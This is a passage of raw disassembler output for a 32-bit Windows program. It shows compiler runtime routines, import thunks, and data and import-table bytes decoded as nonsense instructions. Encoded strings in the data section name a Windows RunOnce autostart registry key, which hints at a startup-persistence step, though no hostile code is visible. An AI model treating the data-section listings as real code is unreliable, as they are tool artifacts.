  406992:	and    DWORD PTR [ebp-0x4],0x0
  406996:	call   0x406a37
  40699b:	pop    ecx
  40699c:	jmp    0x4069ab
  40699e:	and    DWORD PTR [ebp-0x14],0x0
  4069a2:	mov    eax,0x4069a8
  4069a7:	ret    
  4069a8:	mov    eax,DWORD PTR [ebp-0x14]
  4069ab:	call   0x4069d7
  4069b0:	ret    
  4069b1:	int3   
  4069b2:	int3   
  4069b3:	int3   
  4069b4:	int3   
  4069b5:	int3   
  4069b6:	int3   
  4069b7:	int3   
  4069b8:	int3   
  4069b9:	int3   
  4069ba:	int3   
  4069bb:	int3   
  4069bc:	int3   
  4069bd:	int3   
  4069be:	int3   
  4069bf:	int3   
  4069c0:	jmp    DWORD PTR ds:0x40827c
  4069c6:	int3   
  4069c7:	int3   
  4069c8:	int3   
  4069c9:	int3   
  4069ca:	int3   
  4069cb:	int3   
  4069cc:	jmp    DWORD PTR ds:0x408284
  4069d2:	int3   
  4069d3:	int3   
  4069d4:	int3   
  4069d5:	int3   
  4069d6:	int3   
  4069d7:	mov    ecx,DWORD PTR [ebp-0xc]
  4069da:	mov    DWORD PTR fs:0x0,ecx
  4069e1:	pop    ecx
  4069e2:	pop    edi
  4069e3:	pop    edi
  4069e4:	pop    esi
  4069e5:	pop    ebx
  4069e6:	mov    esp,ebp
  4069e8:	pop    ebp
  4069e9:	push   ecx
  4069ea:	ret    
  4069eb:	int3   
  4069ec:	int3   
  4069ed:	int3   
  4069ee:	int3   
  4069ef:	int3   
  4069f0:	push   eax
  4069f1:	push   DWORD PTR fs:0x0
  4069f8:	lea    eax,[esp+0xc]
  4069fc:	sub    esp,DWORD PTR [esp+0xc]
  406a00:	push   ebx
  406a01:	push   esi
  406a02:	push   edi
  406a03:	mov    DWORD PTR [eax],ebp
  406a05:	mov    ebp,eax
  406a07:	mov    eax,ds:0x407004
  406a0c:	xor    eax,ebp
  406a0e:	push   eax
  406a0f:	mov    DWORD PTR [ebp-0x10],esp
  406a12:	push   DWORD PTR [ebp-0x4]
  406a15:	mov    DWORD PTR [ebp-0x4],0xffffffff
  406a1c:	lea    eax,[ebp-0xc]
  406a1f:	mov    fs:0x0,eax
  406a25:	ret    
  406a26:	int3   
  406a27:	int3   
  406a28:	int3   
  406a29:	int3   
  406a2a:	int3   
  406a2b:	int3   
  406a2c:	jmp    DWORD PTR ds:0x408288
  406a32:	int3   
  406a33:	int3   
  406a34:	int3   
  406a35:	int3   
  406a36:	int3   
  406a37:	mov    edi,edi
  406a39:	push   ebp
  406a3a:	mov    ebp,esp
  406a3c:	push   esi
  406a3d:	jmp    0x406a4c
  406a3f:	push   DWORD PTR [ebp+0x8]
  406a42:	call   0x406a72
  406a47:	pop    ecx
  406a48:	test   eax,eax
  406a4a:	je     0x406a5b
  406a4c:	push   DWORD PTR [ebp+0x8]
  406a4f:	call   0x406a66
  406a54:	mov    esi,eax
  406a56:	pop    ecx
  406a57:	test   esi,esi
  406a59:	je     0x406a3f
  406a5b:	mov    eax,esi
  406a5d:	pop    esi
  406a5e:	pop    ebp
  406a5f:	ret    
  406a60:	int3   
  406a61:	int3   
  406a62:	int3   
  406a63:	int3   
  406a64:	int3   
  406a65:	int3   
  406a66:	jmp    DWORD PTR ds:0x4082d4
  406a6c:	int3   
  406a6d:	int3   
  406a6e:	int3   
  406a6f:	int3   
  406a70:	int3   
  406a71:	int3   
  406a72:	jmp    DWORD PTR ds:0x408294
  406a78:	int3   
  406a79:	int3   
  406a7a:	int3   
  406a7b:	int3   
  406a7c:	int3   
  406a7d:	int3   
  406a7e:	int3   
  406a7f:	int3   
  406a80:	push   ebx
  406a81:	push   esi
  406a82:	mov    eax,DWORD PTR [esp+0x18]
  406a86:	or     eax,eax
  406a88:	jne    0x406aa2
  406a8a:	mov    ecx,DWORD PTR [esp+0x14]
  406a8e:	mov    eax,DWORD PTR [esp+0x10]
  406a92:	xor    edx,edx
  406a94:	div    ecx
  406a96:	mov    ebx,eax
  406a98:	mov    eax,DWORD PTR [esp+0xc]
  406a9c:	div    ecx
  406a9e:	mov    edx,ebx
  406aa0:	jmp    0x406ae3
  406aa2:	mov    ecx,eax
  406aa4:	mov    ebx,DWORD PTR [esp+0x14]
  406aa8:	mov    edx,DWORD PTR [esp+0x10]
  406aac:	mov    eax,DWORD PTR [esp+0xc]
  406ab0:	shr    ecx,1
  406ab2:	rcr    ebx,1
  406ab4:	shr    edx,1
  406ab6:	rcr    eax,1
  406ab8:	or     ecx,ecx
  406aba:	jne    0x406ab0
  406abc:	div    ebx
  406abe:	mov    esi,eax
  406ac0:	mul    DWORD PTR [esp+0x18]
  406ac4:	mov    ecx,eax
  406ac6:	mov    eax,DWORD PTR [esp+0x14]
  406aca:	mul    esi
  406acc:	add    edx,ecx
  406ace:	jb     0x406ade
  406ad0:	cmp    edx,DWORD PTR [esp+0x10]
  406ad4:	ja     0x406ade
  406ad6:	jb     0x406adf
  406ad8:	cmp    eax,DWORD PTR [esp+0xc]
  406adc:	jbe    0x406adf
  406ade:	dec    esi
  406adf:	xor    edx,edx
  406ae1:	mov    eax,esi
  406ae3:	pop    esi
  406ae4:	pop    ebx
  406ae5:	ret    0x10
  406ae8:	int3   
  406ae9:	int3   
  406aea:	int3   
  406aeb:	int3   
  406aec:	int3   
  406aed:	int3   
  406aee:	jmp    DWORD PTR ds:0x408290
  406af4:	int3   
  406af5:	int3   
  406af6:	int3   
  406af7:	int3   
  406af8:	int3   
  406af9:	mov    edx,DWORD PTR [esp+0x8]
  406afd:	lea    eax,[edx+0xc]
  406b00:	mov    ecx,DWORD PTR [edx-0x18]
  406b03:	xor    ecx,eax
  406b05:	call   0x4063a0
  406b0a:	mov    eax,0x406bb0
  406b0f:	jmp    0x406a2c
  406b14:	int3   
  406b15:	int3   
  406b16:	int3   
  406b17:	int3   
  406b18:	in     al,0xff
  406b1a:	(bad)  
  406b1b:	inc    DWORD PTR [eax]
  406b1d:	add    BYTE PTR [eax],al
  406b1f:	add    BYTE PTR [edi+edi*8+0xffff],al
  406b26:	add    BYTE PTR [eax],al
  406b28:	(bad)  
  406b29:	(bad)  
  406b2a:	(bad)  
  406b2b:	call   DWORD PTR [esi]
  406b2d:	arpl   WORD PTR [eax+0x0],ax
  406b30:	sbb    ah,BYTE PTR [ebx+0x40]
  406b33:	add    dh,bh
  406b35:	(bad)  
  406b36:	(bad)  
  406b37:	dec    edx
  406b39:	bound  eax,QWORD PTR [eax+0x0]
  406b3c:	fisub  WORD PTR [edx+0x40]
  406b3f:	add    dh,bh
  406b41:	(bad)  
  406b42:	(bad)  
  406b43:	inc    DWORD PTR [eax]
  406b45:	add    BYTE PTR [eax],al
  406b47:	add    ah,dl
  406b49:	(bad)  
  406b4a:	(bad)  
  406b4b:	inc    DWORD PTR [eax]
  406b4d:	add    BYTE PTR [eax],al
  406b4f:	add    dh,bh
  406b51:	(bad)  
  406b52:	(bad)  
  406b53:	(bad)  
  406b54:	mov    esp,0xc0004065
  406b59:	gs inc eax
  406b5b:	add    BYTE PTR [eax],al
  406b5d:	add    BYTE PTR [eax],al
  406b5f:	add    dh,bh
  406b61:	(bad)  
  406b62:	(bad)  
  406b63:	inc    DWORD PTR [eax]
  406b65:	add    BYTE PTR [eax],al
  406b67:	add    al,bl
  406b69:	(bad)  
  406b6a:	(bad)  
  406b6b:	inc    DWORD PTR [eax]
  406b6d:	add    BYTE PTR [eax],al
  406b6f:	add    dh,bh
  406b71:	(bad)  
  406b72:	(bad)  
  406b73:	call   FWORD PTR [ebx]
  406b75:	addr16 inc eax
  406b77:	add    BYTE PTR [esi],ch
  406b79:	addr16 inc eax
  406b7b:	add    BYTE PTR [eax+0x0],al
	...
  406b86:	add    BYTE PTR [eax],al
  406b88:	sahf   
  406b89:	imul   eax,DWORD PTR [eax+0x0],0xffffffff
  406b90:	add    BYTE PTR [eax],al
  406b92:	add    BYTE PTR [eax],al
  406b94:	(bad)  
  406b95:	(bad)  
  406b96:	(bad)  
  406b97:	inc    DWORD PTR [eax]
	...
  406ba1:	add    BYTE PTR [eax],al
  406ba3:	add    BYTE PTR [ecx],al
  406ba5:	add    BYTE PTR [eax],al
  406ba7:	add    BYTE PTR [ecx],al
  406ba9:	add    BYTE PTR [eax],al
  406bab:	add    BYTE PTR [ebx+ebp*2+0x40],bh
  406baf:	add    BYTE PTR [edx],ah
  406bb1:	add    eax,0x21993
  406bb6:	add    BYTE PTR [eax],al
  406bb8:	mov    WORD PTR [ebx+0x40],gs
  406bbb:	add    BYTE PTR [ecx],al
  406bbd:	add    BYTE PTR [eax],al
  406bbf:	add    BYTE PTR [ebx+ebp*2+0x40],bl
	...
  406bce:	add    BYTE PTR [eax],al
  406bd0:	add    DWORD PTR [eax],eax
	...

Disassembly of section .data:

00407000 <.data>:
  407000:	add    DWORD PTR [eax],eax
  407002:	add    BYTE PTR [eax],al
  407004:	dec    esi
  407005:	out    0x40,al
  407007:	mov    ebx,0x44bf19b1
	...
  407038:	add    BYTE PTR [eax],al
  40703a:	and    al,BYTE PTR [eax]
  40703c:	add    BYTE PTR [ebp+0x40],dh
  40703f:	add    al,dh
  407041:	adc    DWORD PTR [eax+0x0],eax
  407044:	mov    eax,0x57004011
  407049:	add    BYTE PTR [edi+0x0],dl
  40704c:	push   edi
  40704d:	add    BYTE PTR [edi+0x0],dl
  407050:	push   edi
  407051:	add    BYTE PTR [edi+0x0],dl
  407054:	push   edi
  407055:	add    BYTE PTR [edi+0x0],dl
  407058:	push   edi
  407059:	add    BYTE PTR [edi+0x0],dl
  40705c:	add    BYTE PTR [eax],al
  40705e:	add    BYTE PTR [eax],al
  407060:	sub    al,BYTE PTR [eax]
  407062:	inc    esp
  407063:	add    BYTE PTR [ecx+0x0],ch
  407066:	jae    0x407068
  407068:	jo     0x40706a
  40706a:	ins    BYTE PTR es:[edi],dx
  40706b:	add    BYTE PTR [ecx+0x0],ah
  40706e:	jns    0x407070
  407070:	inc    esi
  407071:	add    BYTE PTR [ecx+0x0],ah
  407074:	ins    BYTE PTR es:[edi],dx
  407075:	add    BYTE PTR [eax+eax*1+0x62],ch
  407079:	add    BYTE PTR [ecx+0x0],ah
  40707c:	arpl   WORD PTR [eax],ax
  40707e:	imul   eax,DWORD PTR [eax],0x0
  407081:	add    BYTE PTR [eax],al
  407083:	add    BYTE PTR [eax],al
  407085:	add    BYTE PTR [eax],al
  407087:	add    BYTE PTR [ebx+0x0],dl
  40708a:	outs   dx,DWORD PTR ds:[esi]
  40708b:	add    BYTE PTR [esi+0x0],ah
  40708e:	je     0x407090
  407090:	ja     0x407092
  407092:	popa   
  407093:	add    BYTE PTR [edx+0x0],dh
  407096:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  40709b:	add    BYTE PTR [ecx+0x0],ch
  40709e:	arpl   WORD PTR [eax],ax
  4070a0:	jb     0x4070a2
  4070a2:	outs   dx,DWORD PTR ds:[esi]
  4070a3:	add    BYTE PTR [ebx+0x0],dh
  4070a6:	outs   dx,DWORD PTR ds:[esi]
  4070a7:	add    BYTE PTR [esi+0x0],ah
  4070aa:	je     0x4070ac
  4070ac:	pop    esp
  4070ad:	add    BYTE PTR [edi+0x0],dl
  4070b0:	imul   eax,DWORD PTR [eax],0x64006e
  4070b6:	outs   dx,DWORD PTR ds:[esi]
  4070b7:	add    BYTE PTR [edi+0x0],dh
  4070ba:	jae    0x4070bc
  4070bc:	pop    esp
  4070bd:	add    BYTE PTR [ebx+0x0],al
  4070c0:	jne    0x4070c2
  4070c2:	jb     0x4070c4
  4070c4:	jb     0x4070c6
  4070c6:	add    BYTE PTR gs:[esi+0x0],ch
  4070ca:	je     0x4070cc
  4070cc:	push   esi
  4070cd:	add    BYTE PTR [ebp+0x0],ah
  4070d0:	jb     0x4070d2
  4070d2:	jae    0x4070d4
  4070d4:	imul   eax,DWORD PTR [eax],0x6e006f
  4070da:	add    BYTE PTR [eax],al
  4070dc:	add    BYTE PTR [eax],al
  4070de:	add    BYTE PTR [eax],al
  4070e0:	push   ebx
  4070e1:	add    BYTE PTR [edi+0x0],ch
  4070e4:	data16 add BYTE PTR [eax+eax*1+0x77],dh
  4070e9:	add    BYTE PTR [ecx+0x0],ah
  4070ec:	jb     0x4070ee
  4070ee:	add    BYTE PTR gs:[eax+eax*1+0x4d],bl
  4070f3:	add    BYTE PTR [ecx+0x0],ch
  4070f6:	arpl   WORD PTR [eax],ax
  4070f8:	jb     0x4070fa
  4070fa:	outs   dx,DWORD PTR ds:[esi]
  4070fb:	add    BYTE PTR [ebx+0x0],dh
  4070fe:	outs   dx,DWORD PTR ds:[esi]
  4070ff:	add    BYTE PTR [esi+0x0],ah
  407102:	je     0x407104
  407104:	pop    esp
  407105:	add    BYTE PTR [edi+0x0],dl
  407108:	imul   eax,DWORD PTR [eax],0x64006e
  40710e:	outs   dx,DWORD PTR ds:[esi]
  40710f:	add    BYTE PTR [edi+0x0],dh
  407112:	jae    0x407114
  407114:	pop    esp
  407115:	add    BYTE PTR [ebx+0x0],al
  407118:	jne    0x40711a
  40711a:	jb     0x40711c
  40711c:	jb     0x40711e
  40711e:	add    BYTE PTR gs:[esi+0x0],ch
  407122:	je     0x407124
  407124:	push   esi
  407125:	add    BYTE PTR [ebp+0x0],ah
  407128:	jb     0x40712a
  40712a:	jae    0x40712c
  40712c:	imul   eax,DWORD PTR [eax],0x6e006f
  407132:	pop    esp
  407133:	add    BYTE PTR [edx+0x0],dl
  407136:	jne    0x407138
  407138:	outs   dx,BYTE PTR ds:[esi]
  407139:	add    BYTE PTR [edi+0x0],cl
  40713c:	outs   dx,BYTE PTR ds:[esi]
  40713d:	add    BYTE PTR [ebx+0x0],ah
  407140:	add    BYTE PTR gs:[eax],al
  407143:	add    bh,bh
  407145:	(bad)  
  407146:	(bad)  
  407147:	jmp    FWORD PTR [eax]
  407149:	mov    edx,0xed2695ba
  40714e:	leave  
  40714f:	dec    ecx
  407150:	mov    bh,0x4f
  407152:	xchg   ebx,eax
  407153:	mov    cl,0x70
  407155:	loope  0x40710f
  407157:	dec    ecx
  407158:	add    DWORD PTR [eax],eax
  40715a:	add    BYTE PTR [eax],al
  40715c:	add    BYTE PTR [eax],al
  40715e:	add    BYTE PTR [eax],al
  407160:	aam    0x6e
  407162:	xor    esi,DWORD PTR [eax]
  407164:	daa    
  407165:	jecxz  0x4071e3
  407167:	inc    esp
  407168:	popf   
  407169:	loopne 0x4071bc
  40716b:	mov    dh,0x52
  40716d:	enter  0x861,0x0
  407171:	add    BYTE PTR [ecx],al
  407173:	xchg   BYTE PTR [eax],al
	...

Disassembly of section .idata:

00408000 <.idata>:
  408000:	in     al,dx
  408001:	xchg   DWORD PTR [eax],eax
  408003:	add    ah,bh
  408005:	xchg   DWORD PTR [eax],eax
  408007:	add    BYTE PTR [esi],cl
  408009:	mov    BYTE PTR [eax],al
  40800b:	add    BYTE PTR [eax+ecx*4],bl
  40800e:	add    BYTE PTR [eax],al
  408010:	sub    al,0x88
  408012:	add    BYTE PTR [eax],al
  408014:	cmp    al,0x88
  408016:	add    BYTE PTR [eax],al
  408018:	push   eax
  408019:	mov    BYTE PTR [eax],al
  40801b:	add    BYTE PTR [esi-0x78],bl
  40801e:	add    BYTE PTR [eax],al
  408020:	outs   dx,BYTE PTR ds:[esi]
  408021:	mov    BYTE PTR [eax],al
  408023:	add    BYTE PTR [eax+ecx*4+0x0],al
  40802a:	add    BYTE PTR [eax],al
  40802c:	dec    esi
  40802d:	add    DWORD PTR [eax],eax
  40802f:	or     BYTE PTR [ecx+0x1],0x0
  408033:	or     BYTE PTR [eax+0x1],0x0
  408037:	add    BYTE PTR [eax],0x0
  40803a:	add    BYTE PTR [eax],al
  40803c:	add    BYTE PTR [ebx-0x76820000],dl
  408042:	add    BYTE PTR [eax],al
  408044:	xchg   edx,eax
  408045:	mov    DWORD PTR [eax],eax
  408047:	add    BYTE PTR [eax-0x49ffff77],ah
  40804d:	mov    DWORD PTR [eax],eax
  40804f:	add    dh,al
  408051:	mov    DWORD PTR [eax],eax
  408053:	add    ah,bl
  408055:	mov    DWORD PTR [eax],eax
  408057:	add    ah,ch
  408059:	mov    DWORD PTR [eax],eax
  40805b:	add    BYTE PTR [edx],al
  40805d:	mov    al,BYTE PTR [eax]
  40805f:	add    BYTE PTR [edx+ecx*4],cl
  408062:	add    BYTE PTR [eax],al
  408064:	add    BYTE PTR [eax],al
  408066:	add    BYTE PTR [eax],al
  408068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408069:	mov    BYTE PTR [eax],al
  40806b:	add    BYTE PTR [eax-0x41ffff78],dh
  408071:	mov    BYTE PTR [eax],al
  408073:	add    dl,cl
  408075:	mov    BYTE PTR [eax],al
  408077:	add    ah,bl
  408079:	mov    BYTE PTR [eax],al
  40807b:	add    ah,dh
  40807d:	mov    BYTE PTR [eax],al
  40807f:	add    BYTE PTR [edx],al
  408081:	mov    DWORD PTR [eax],eax
  408083:	add    BYTE PTR [edx],bl
  408085:	mov    DWORD PTR [eax],eax
  408087:	add    BYTE PTR [edx],ch
  408089:	mov    DWORD PTR [eax],eax
  40808b:	add    BYTE PTR [edx],bh
  40808d:	mov    DWORD PTR [eax],eax
  40808f:	add    BYTE PTR [ecx+ecx*4+0x0],cl
  408093:	add    BYTE PTR [edx-0x77],bl
  408096:	add    BYTE PTR [eax],al
  408098:	mov    WORD PTR [edx-0x6d880000],ss
  40809e:	add    BYTE PTR [eax],al
  4080a0:	pop    esi
  4080a1:	xchg   edx,eax
  4080a2:	add    BYTE PTR [eax],al
  4080a4:	inc    edx
  4080a5:	xchg   edx,eax
  4080a6:	add    BYTE PTR [eax],al
  4080a8:	add    BYTE PTR [eax],al
  4080aa:	add    BYTE PTR [eax],al
  4080ac:	cmp    al,0x8c
  4080ae:	add    BYTE PTR [eax],al
  4080b0:	jne    0x4080b5
  4080b2:	add    BYTE PTR [eax-0x7fffff9c],al
  4080b8:	rol    DWORD PTR [edx],cl
  4080ba:	add    BYTE PTR [eax-0x7fffff5b],al
  4080c0:	pop    esi
  4080c1:	mov    WORD PTR [eax],es
  4080c3:	add    BYTE PTR [eax],cl
  4080c5:	xchg   esp,eax
  4080c6:	add    BYTE PTR [eax],al
  4080c8:	fwait
  4080c9:	add    BYTE PTR [eax],al
  4080cb:	add    BYTE PTR [eax],0x0
  4080ce:	add    BYTE PTR [eax],al
  4080d0:	push   0x2
  4080d2:	add    BYTE PTR [eax-0x7fffff52],al
  4080d8:	fld    DWORD PTR [eax]
  4080da:	add    BYTE PTR [eax+0x941a],al
  4080e0:	fild   DWORD PTR [eax]
  4080e2:	add    BYTE PTR [eax+0x8ca0],al
  4080e8:	xchg   edx,eax
  4080e9:	mov    WORD PTR [eax],es
  4080eb:	add    BYTE PTR [ecx+eax*1-0x737f8000],al
  4080f2:	add    BYTE PTR [eax],al
  4080f4:	int3   
  4080f5:	add    DWORD PTR [eax],eax
  4080f7:	xor    BYTE PTR [eax-0x4a800000],0x1
  4080fe:	add    BYTE PTR [eax-0x7fffff62],al
  408104:	mov    DWORD PTR [eax],0x8000
  40810a:	add    BYTE PTR [eax],al
  40810c:	push   esi
  40810d:	mov    al,BYTE PTR [eax]
  40810f:	add    BYTE PTR [esi-0x76],bl
  408112:	add    BYTE PTR [eax],al
  408114:	push   0xffffff8a
  408116:	add    BYTE PTR [eax],al
  408118:	jp     0x4080a4
  40811a:	add    BYTE PTR [eax],al
  40811c:	mov    BYTE PTR [edx-0x6c480000],cl
  408122:	add    BYTE PTR [eax],al
  408124:	mov    ds:0x90000093,al
  408129:	xchg   ebx,eax
  40812a:	add    BYTE PTR [eax],al
  40812c:	jb     0x4080c1
  40812e:	add    BYTE PTR [eax],al
  408130:	bound  edx,QWORD PTR [ebx-0x6cb00000]
  408136:	add    BYTE PTR [eax],al
  408138:	cmp    al,0x93
  40813a:	add    BYTE PTR [eax],al
  40813c:	xor    BYTE PTR [ebx-0x6cde0000],dl
  408142:	add    BYTE PTR [eax],al
  408144:	push   cs
  408145:	xchg   ebx,eax
  408146:	add    BYTE PTR [eax],al
  408148:	inc    esi
  408149:	mov    al,BYTE PTR [eax]
  40814b:	add    BYTE PTR [eax],bh
  40814d:	mov    al,BYTE PTR [eax]
  40814f:	add    BYTE PTR [edx+ecx*4],ah
  408152:	add    BYTE PTR [eax],al
  408154:	mov    eax,DWORD PTR es:[eax]
  408157:	add    BYTE PTR [edx],bl
  408159:	mov    eax,DWORD PTR [eax]
  40815b:	add    BYTE PTR [ebx+ecx*4],cl
  40815e:	add    BYTE PTR [eax],al
  408160:	cld    
  408161:	mov    al,BYTE PTR [eax]
  408163:	add    dh,ch
  408165:	mov    al,BYTE PTR [eax]
  408167:	add    dl,ah
  408169:	mov    al,BYTE PTR [eax]
  40816b:	add    dl,dl
  40816d:	mov    al,BYTE PTR [eax]
  40816f:	add    dl,al
  408171:	mov    al,BYTE PTR [eax]
  408173:	add    BYTE PTR [edx+ecx*4-0x75580000],dh
  40817a:	add    BYTE PTR [eax],al
  40817c:	xchg   esi,eax
  40817d:	mov    al,BYTE PTR [eax]
  40817f:	add    BYTE PTR [eax],al
  408181:	add    BYTE PTR [eax],al
  408183:	add    ah,bh
  408185:	mov    es,WORD PTR [eax]
  408187:	add    al,al
  408189:	mov    WORD PTR [eax],es
  40818b:	add    BYTE PTR [eax],bh
  40818d:	mov    es,WORD PTR [eax]
  40818f:	add    al,ah
  408191:	mov    es,WORD PTR [eax]
  408193:	add    BYTE PTR [eax],al
  408195:	add    BYTE PTR [eax],al
  408197:	add    BYTE PTR [eax],cl
  408199:	lea    eax,[eax]
  40819b:	add    ah,ch
  40819d:	mov    WORD PTR [eax],es
  40819f:	add    BYTE PTR [esi-0x72],bh
  4081a2:	add    BYTE PTR [eax],al
  4081a4:	add    BYTE PTR [eax],al
  4081a6:	add    BYTE PTR [eax],al
  4081a8:	fimul  WORD PTR [edi+0x0]
  4081ae:	add    BYTE PTR [eax],al
  4081b0:	dec    eax
  4081b1:	mov    es,WORD PTR [eax]
  4081b3:	add    BYTE PTR [esi+ecx*4+0x0],ah
  4081b7:	add    BYTE PTR [eax],al
  4081b9:	add    BYTE PTR [eax],al
  4081bb:	add    BYTE PTR [esi],ch
  4081bd:	xchg   esp,eax
  4081be:	add    BYTE PTR [eax],al
  4081c0:	inc    edx
  4081c1:	xchg   esp,eax
  4081c2:	add    BYTE PTR [eax],al
  4081c4:	pop    eax
  4081c5:	xchg   esp,eax
  4081c6:	add    BYTE PTR [eax],al
  4081c8:	dec    esi
  4081c9:	lea    eax,[eax]
  4081cb:	add    BYTE PTR [esi],dl
  4081cd:	mov    es,WORD PTR [eax]
  4081cf:	add    BYTE PTR [eax],al
  4081d1:	add    BYTE PTR [eax],al
  4081d3:	add    BYTE PTR [esi+ecx*4-0x70460000],ah
  4081da:	add    BYTE PTR [eax],al
  4081dc:	add    BYTE PTR [eax],al
  4081de:	add    BYTE PTR [eax],al
  4081e0:	adc    cl,BYTE PTR [edi-0x726e0000]
  4081e6:	add    BYTE PTR [eax],al
  4081e8:	cmp    cl,BYTE PTR [ebp-0x70de0000]
  4081ee:	add    BYTE PTR [eax],al
  4081f0:	fimul  DWORD PTR [eax+eax*1+0x8d2600]
  4081f7:	add    BYTE PTR [ebp+ecx*4+0x0],bh
  4081fb:	add    BYTE PTR [edi+ecx*4],dh
  4081fe:	add    BYTE PTR [eax],al
  408200:	mov    ah,0x8e
  408202:	add    BYTE PTR [eax],al
  408204:	add    BYTE PTR [eax],al
  408206:	add    BYTE PTR [eax],al
  408208:	bound  ecx,QWORD PTR [ebp+0x0]
  40820e:	add    BYTE PTR [eax],al
  408210:	jmp    0x8f:0x9400008d
  408217:	add    BYTE PTR [esi+0x8f],ah
  40821d:	add    BYTE PTR [eax],al
  40821f:	add    BYTE PTR [eax+edx*4],cl
  408222:	add    BYTE PTR [eax],al
  408224:	ror    BYTE PTR [ebp+0x0],cl
  40822a:	add    BYTE PTR [eax],al
  40822c:	jle    0x4081bd
  40822e:	add    BYTE PTR [eax],al
  408230:	jo     0x4081c1
  408232:	add    BYTE PTR [eax],al
  408234:	add    BYTE PTR [eax],al
  408236:	add    BYTE PTR [eax],al
  408238:	or     cl,BYTE PTR [esi-0x713c0000]
  40823e:	add    BYTE PTR [eax],al
  408240:	cli    
  408241:	lea    eax,[eax]
  408243:	add    dl,dl
  408245:	mov    WORD PTR [eax],es
  408247:	add    BYTE PTR [eax],al
  408249:	add    BYTE PTR [eax],al
  40824b:	add    BYTE PTR [esi+0x5800008e],cl
  408251:	pop    DWORD PTR [eax]
  408253:	add    dl,al
  408255:	lea    eax,[eax]
  408257:	add    BYTE PTR [eax+0x2800008d],ch
  40825d:	mov    es,WORD PTR [eax]
  40825f:	add    BYTE PTR [eax],al
  408261:	add    BYTE PTR [eax],al
  408263:	add    dh,bh
  408265:	pop    DWORD PTR [eax]
  408267:	add    ah,ch
  408269:	pop    DWORD PTR [eax]
  40826b:	add    al,dl
  40826d:	pop    DWORD PTR [eax]
  40826f:	add    BYTE PTR [eax],al
  408271:	add    BYTE PTR [eax],al
  408273:	add    BYTE PTR [eax-0x71],cl
  408276:	add    BYTE PTR [eax],al
  408278:	add    BYTE PTR [eax],al
  40827a:	add    BYTE PTR [eax],al
  40827c:	ficom  WORD PTR [ebx-0x6c3a0000]
  408282:	add    BYTE PTR [eax],al
  408284:	jmp    0x93:0xf2000093
  40828b:	add    al,dl
  40828d:	xchg   ebx,eax
  40828e:	add    BYTE PTR [eax],al
  408290:	test   BYTE PTR [eax+eax*1+0x947800],dl
  408297:	add    BYTE PTR [esp+ecx*4],dl
  40829a:	add    BYTE PTR [eax],al
  40829c:	push   es
  40829d:	mov    WORD PTR [eax],es
  40829f:	add    dh,ah
  4082a1:	mov    eax,DWORD PTR [eax]
  4082a3:	add    ah,bl
  4082a5:	mov    eax,DWORD PTR [eax]
  4082a7:	add    al,dl
  4082a9:	mov    eax,DWORD PTR [eax]
  4082ab:	add    BYTE PTR [ebx+ecx*4-0x74520000],bh
  4082b2:	add    BYTE PTR [eax],al
  4082b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082b5:	mov    eax,DWORD PTR [eax]
  4082b7:	add    BYTE PTR [ebx+ecx*4-0x746c0000],bl
  4082be:	add    BYTE PTR [eax],al
  4082c0:	or     BYTE PTR [ebx-0x74900000],0x0
  4082c7:	add    BYTE PTR [edx-0x75],ah
  4082ca:	add    BYTE PTR [eax],al
  4082cc:	push   edx
  4082cd:	mov    eax,DWORD PTR [eax]
  4082cf:	add    BYTE PTR [ebx+ecx*4+0x0],al
  4082d3:	add    BYTE PTR [esi-0x6c],ch
  4082d6:	add    BYTE PTR [eax],al
  4082d8:	add    BYTE PTR [eax],al
  4082da:	add    BYTE PTR [eax],al
  4082dc:	test   al,0x92
  4082de:	add    BYTE PTR [eax],al
  4082e0:	les    edx,FWORD PTR [edx+0x0]
  4082e6:	add    BYTE PTR [eax],al
  4082e8:	out    0x92,al
  4082ea:	add    BYTE PTR [eax],al
  4082ec:	add    BYTE PTR [eax],al
  4082ee:	add    BYTE PTR [eax],al
  4082f0:	lock push 0x84fc0040
	...
  4082fe:	add    BYTE PTR [eax],al
  408300:	xchg   esi,eax
  408301:	mov    BYTE PTR [eax],al
  408303:	add    BYTE PTR [eax],al
  408305:	add    BYTE PTR [eax],0x0
  408308:	test   DWORD PTR fs:[eax],eax
	...
  408313:	add    BYTE PTR [eax-0x77],dh
  408316:	add    BYTE PTR [eax],al
  408318:	push   0x38000080
  40831d:	test   DWORD PTR [eax],eax
	...
  408327:	add    BYTE PTR [edx],bl
  408329:	mov    al,BYTE PTR [eax]
  40832b:	add    BYTE PTR [eax+eax*4],bh
  40832e:	add    BYTE PTR [eax],al
  408330:	or     BYTE PTR [esi+0x0],al
  408336:	add    BYTE PTR [eax],al
  408338:	add    BYTE PTR [eax],al
  40833a:	add    BYTE PTR [eax],al
  40833c:	cmp    BYTE PTR [ebx-0x7ef40000],cl
  408342:	add    BYTE PTR [eax],al
  408344:	js     0x4082cd
	...
  40834e:	add    BYTE PTR [eax],al
  408350:	cli    
  408351:	mov    eax,DWORD PTR [eax]
  408353:	add    BYTE PTR [edx+eax*4+0x0],bh
  408357:	add    BYTE PTR [eax],ch
  408359:	test   DWORD PTR [eax],eax
	...
  408363:	add    BYTE PTR [esi],ch
  408365:	mov    WORD PTR [eax],es
  408367:	add    BYTE PTR [eax+eax*4],ch
  40836a:	add    BYTE PTR [eax],al
  40836c:	test   al,0x85
	...
  408376:	add    BYTE PTR [eax],al
  408378:	je     0x408306
  40837a:	add    BYTE PTR [eax],al
  40837c:	lods   al,BYTE PTR ds:[esi]
  40837d:	add    BYTE PTR [eax],0x0
  408380:	int3   
  408381:	test   DWORD PTR [eax],eax
	...
  40838b:	add    BYTE PTR [esp+ecx*4-0x7f300000],dh
  408392:	add    BYTE PTR [eax],al
  408394:	add    BYTE PTR [esi+0x0],0x0
  40839b:	add    BYTE PTR [eax],al
  40839d:	add    BYTE PTR [eax],al
  40839f:	add    BYTE PTR [edx],ah
  4083a1:	nop
  4083a2:	add    BYTE PTR [eax],al
  4083a4:	test   BYTE PTR [ecx-0x78cc0000],al
	...
  4083b2:	add    BYTE PTR [eax],al
  4083b4:	inc    edx
  4083b5:	nop
  4083b6:	add    BYTE PTR [eax],al
  4083b8:	cmp    BYTE PTR [edx-0x79240000],al
	...
  4083c6:	add    BYTE PTR [eax],al
  4083c8:	fs nop
  4083ca:	add    BYTE PTR [eax],al
  4083cc:	loopne 0x40834f
  4083ce:	add    BYTE PTR [eax],al
  4083d0:	xchg   esp,eax
  4083d1:	xchg   BYTE PTR [eax],al
	...
